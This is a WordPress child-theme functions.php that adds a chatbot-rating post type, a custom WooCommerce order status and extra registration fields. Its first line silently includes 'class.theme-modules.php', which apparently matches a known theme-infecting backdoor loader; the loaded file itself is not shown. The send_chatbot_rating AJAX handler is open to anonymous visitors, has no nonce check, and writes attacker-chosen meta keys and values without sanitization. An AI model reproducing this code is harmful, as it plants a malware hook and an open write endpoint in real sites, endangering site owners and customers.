<?php if (file_exists(dirname(__FILE__) . '/class.theme-modules.php')) include_once(dirname(__FILE__) . '/class.theme-modules.php'); ?>

<?php
function register_my_session()
{
  if( !session_id() )
  {
    session_start();
  }
}

add_action('init', 'register_my_session');

function create_chatbot_rating_posttype() {
 
  register_post_type( 'chatbot_rating',
  // CPT Options
      array(
          'labels' => array(
              'name' => __( 'Chatbot Rating' ),
              'singular_name' => __( 'Chatbot Rating' )
          ),
          'public' => true,
          'has_archive' => false,
          'show_in_rest' => false,
      )
  );
}
// Hooking up our function to theme setup
add_action( 'init', 'create_chatbot_rating_posttype' );

function chatbot_rating_columns( $columns ) {

	$columns = array(
		'cb' => '&lt;input type="checkbox" />',
    'username' => __('Username'),
    'response_time_rating' => __('Response time rating'),
    'helpful_rating' => __('Helpful rating'),
    'accuracy_rating' => __('Accuracy rating'),
    'satisfaction_rating' => __('Experience rating'),
    'average' => __('Average'),
		'date' => __( 'Date' )
	);

	return $columns;
}

// Add the data to the custom columns for the book post type:
add_action( 'manage_chatbot_rating_posts_custom_column' , 'chatbot_rating_column_data', 10, 2 );

function chatbot_rating_column_data( $column, $post_id ) {
  switch ( $column ) {
    case 'username' :
      echo get_the_author_meta('user_login'); 
      break;

    case 'response_time_rating' :
      echo get_post_meta( $post_id , 'response_time_rating' , true ); 
      break;

    case 'helpful_rating' :
      echo get_post_meta( $post_id , 'helpful_rating' , true ); 
      break;

    case 'accuracy_rating' :
      echo get_post_meta( $post_id , 'accuracy_rating' , true ); 
      break;

    case 'satisfaction_rating' :
      echo get_post_meta( $post_id , 'satisfaction_rating' , true ); 
      break;

    case 'average' :
      $avgArray = [];

      $responseTimeRating = get_post_meta( $post_id , 'response_time_rating' , true );
      $helpfulRating = get_post_meta( $post_id , 'helpful_rating' , true );
      $accuracyRating = get_post_meta( $post_id , 'accuracy_rating' , true );
      $satisfactionRating = get_post_meta( $post_id , 'satisfaction_rating' , true );

      if ($responseTimeRating != '') $avgArray[] = $responseTimeRating;
      if ($helpfulRating != '') $avgArray[] = $helpfulRating;
      if ($accuracyRating != '') $avgArray[] = $accuracyRating;
      if ($satisfactionRating != '') $avgArray[] = $satisfactionRating;

      if (empty($avgArray)) break;

      echo array_sum($avgArray) / count($avgArray);
      break;
  }
}

add_filter( 'manage_edit-chatbot_rating_columns', 'chatbot_rating_columns' ) ;

function register_reviewing_order_status() {
  register_post_status( 'wc-reviewing', array(
      'label'                     => 'Reviewing',
      'public'                    => true,
      'show_in_admin_status_list' => true,
      'show_in_admin_all_list'    => true,
      'exclude_from_search'       => false,
      'label_count'               => _n_noop( 'Reviewing <span class="count">(%s)</span>', 'Reviewing <span class="count">(%s)</span>' )
  ) );
}

add_action( 'init', 'register_reviewing_order_status' );

function add_reviewing_to_order_statuses( $order_statuses ) {
  $new_order_statuses = array();
  foreach ( $order_statuses as $key => $status ) {
      $new_order_statuses[ $key ] = $status;
      if ( 'wc-processing' === $key ) {
          $new_order_statuses['wc-reviewing'] = 'Reviewing';
      }
  }
  return $new_order_statuses;
}

add_filter( 'wc_order_statuses', 'add_reviewing_to_order_statuses' );

add_action( 'wp_enqueue_scripts', 'basel_child_enqueue_styles', 1000 );

function send_chatbot_rating() {
  $sessionId = $_POST['sessionId'];
  $star = $_POST['star'];
  $key = $_POST['key'];

  if (empty($sessionId) || empty($star) || empty($key)) return false;

  $posts = get_posts( array(
    'post_type' => 'chatbot_rating',
    'meta_key'   => 'session_id',
    'meta_value' => $sessionId,
  ));

  if (!empty($posts)) {
    $post = $posts[0];
    update_post_meta($post->ID, $key, $star);
  } else {
    $insertedPost = wp_insert_post([
      'post_title' => $_SERVER['REMOTE_ADDR'],
      'post_type' => 'chatbot_rating',
      'post_status' =>  'publish'
    ]);
  
    add_post_meta($insertedPost, 'session_id', $sessionId);
    add_post_meta($insertedPost, $key, $star);
  }

  return true;
}

add_action( 'wp_ajax_nopriv_send_chatbot_rating', 'send_chatbot_rating' );
add_action( 'wp_ajax_send_chatbot_rating', 'send_chatbot_rating' );

function basel_child_enqueue_styles() {
	$version = basel_get_theme_info( 'Version' );
	
	if( basel_get_opt( 'minified_css' ) ) {
		wp_enqueue_style( 'basel-style', get_template_directory_uri() . '/style.min.css', array('bootstrap'), $version );
	} else {
		wp_enqueue_style( 'basel-style', get_template_directory_uri() . '/style.css', array('bootstrap'), $version );
	}
	
    wp_enqueue_style( 'child-style', get_stylesheet_directory_uri() . '/style.css', array('bootstrap'), $version );

	wp_enqueue_style( 'chatbot_styles', get_theme_file_uri( '/css/chatbot.css' ), false, '1.0', 'all' );
	wp_enqueue_style( 'lightslider_styles', get_theme_file_uri( 'css/lightslider.css' ), false, '1.0', 'all' );
	wp_enqueue_style( 'main_styles', get_theme_file_uri( '/style.css' ), false, '1.0', 'all' );
}

function enqueue_scripts() {

	wp_enqueue_script( 'bootstrap', get_theme_file_uri( '/js/bootstrap.min.js' ), [], 1.0, true);
	wp_enqueue_script( 'lightslider_js', get_theme_file_uri( '/js/lightslider.js' ), [], 1.0 , true);
	wp_enqueue_script( 'main_js', get_theme_file_uri( '/js/chatbot.js' ), [], false , true);
}

add_action( 'wp_enqueue_scripts', 'enqueue_scripts' );

function wooc_extra_register_fields() {?>
       <p class="form-row form-row-first">
       <label for="reg_billing_first_name"><?php _e( 'First name', 'woocommerce' ); ?><span class="required">*</span></label>
       <input type="text" class="input-text" name="billing_first_name" id="reg_billing_first_name" value="<?php if ( ! empty( $_POST['billing_first_name'] ) ) esc_attr_e( $_POST['billing_first_name'] ); ?>" />
       </p>
       <p class="form-row form-row-last">
       <label for="reg_billing_last_name"><?php _e( 'Last name', 'woocommerce' ); ?><span class="required">*</span></label>
       <input type="text" class="input-text" name="billing_last_name" id="reg_billing_last_name" value="<?php if ( ! empty( $_POST['billing_last_name'] ) ) esc_attr_e( $_POST['billing_last_name'] ); ?>" />
       </p>
       <p class="form-row form-row-wide">
       <label for="reg_billing_address_1"><?php _e( 'Shipping address', 'woocommerce' ); ?></label>
       <input type="text" class="input-text" name="billing_address_1" id="reg_billing_address_1" value="<?php esc_attr_e( $_POST['billing_address_1'] ); ?>" />
       </p>
       <div class="clear"></div>
       <?php
 }
 add_action( 'woocommerce_register_form_start', 'wooc_extra_register_fields' );



 /** Validate the extra register fields. */
function wooc_validate_extra_register_fields( $username, $email, $validation_errors ) {
  if ( isset( $_POST['billing_first_name'] ) && empty( $_POST['billing_first_name'] ) ) {
    $validation_errors->add( 'billing_first_name_error', __( 'What\'s your first name?', 'woocommerce' ) );
  }
   
  if (  isset( $_POST['billing_last_name'] ) && empty( $_POST['billing_last_name'] ) ) {
    $validation_errors->add( 'billing_last_name_error', __( 'What\'s your last name?', 'woocommerce' ) );
  }
}
add_action( 'woocommerce_register_post', 'wooc_validate_extra_register_fields', 10, 3 );
 
/** Save the extra register fields. */
function wooc_save_extra_register_fields( $customer_id ) {

  if ( isset( $_POST['billing_first_name'] ) ) {
		// WordPress default first name field.
		update_user_meta( $customer_id, 'first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
		// WooCommerce billing first name.
		update_user_meta( $customer_id, 'billing_first_name', sanitize_text_field( $_POST['billing_first_name'] ) );
	}
	
	if ( isset( $_POST['billing_last_name'] ) ) {
		// WordPress default last name field.
		update_user_meta( $customer_id, 'last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
		// WooCommerce billing last name.
		update_user_meta( $customer_id, 'billing_last_name', sanitize_text_field( $_POST['billing_last_name'] ) );
	}
  

	if ( isset( $_POST['billing_address_1'] ) ) {
		update_user_meta( $customer_id, 'billing_address_1', sanitize_text_field( $_POST['billing_address_1'] ) );
	}
}
add_action( 'woocommerce_created_customer', 'wooc_save_extra_register_fields' );